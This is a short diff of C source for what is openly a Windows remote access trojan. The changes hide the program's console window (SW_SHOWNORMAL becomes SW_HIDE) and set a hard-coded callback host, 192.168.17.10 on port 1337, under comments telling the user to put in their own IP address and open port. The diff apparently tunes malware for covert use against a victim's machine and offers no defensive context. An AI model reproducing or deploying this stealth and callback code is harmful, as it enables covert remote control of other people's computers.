@@ -371,7 +371,7 @@ int main(int argc, char **argv) {
     HWND stealth;                                       //Declare a window handle 
     AllocConsole();                                     //Allocate a new console
     stealth=FindWindowA("ConsoleWindowClass",NULL);     //Find the previous Window handler and hide/show the window depending upon the next command
-    ShowWindow(stealth,SW_SHOWNORMAL);                  //SW_SHOWNORMAL = 1 = show, SW_HIDE = 0 = Hide the console
+    ShowWindow(stealth,SW_HIDE);                        //SW_SHOWNORMAL = 1 = show, SW_HIDE = 0 = Hide the console
 
     // FreeConsole();
     if (argc == 3) 
@@ -380,8 +380,8 @@ int main(int argc, char **argv) {
         RAT(argv[1], port);
     }
     else {
-        char host[] = "192.168.75.100";     // change this to your ip address
-        int port = 1337;                    // change this to your open port
+        char host[] = "192.168.17.10";                  // change this to your ip address
+        int port = 1337;                                // change this to your open port
         RAT(host, port);
     }
     return 0;
